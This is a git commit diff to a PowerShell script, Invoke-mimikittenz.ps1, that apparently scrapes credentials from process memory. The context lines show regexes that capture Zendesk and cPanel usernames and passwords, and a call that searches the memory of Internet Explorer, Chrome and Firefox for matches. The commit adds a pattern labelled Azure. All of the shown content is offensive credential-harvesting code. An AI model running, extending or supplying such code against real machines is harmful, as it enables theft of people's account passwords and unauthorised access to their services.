85b6d3d7f123e8de7c7491d43f6c8edb507fd5fd
wbbigdave <Luke@wbbigdave.com>
2017-09-06 14:28:48 +0100

    Update Invoke-mimikittenz.ps1

--- Invoke-mimikittenz.ps1
+++ Invoke-mimikittenz.ps1
@@ -528,6 +528,8 @@ Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $inmem
     [mimikittenz.MemProcInspector]::AddRegex("Zendesk","user%5Bemail%5D=.{1,50}&user%5Bpassword%5D=.{1,50}")
     #Cpanel
     [mimikittenz.MemProcInspector]::AddRegex("Cpanel","user=.{1,50}&pass=.{1,50}")
+    #Azure
+    [mimikittenz.MemProcInspector]::AddRegex("Azure","azure")
 [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($asciiart))
 $matchesFound=[mimikittenz.MemProcInspector]::InspectManyProcs("iexplore","chrome","firefox")
 
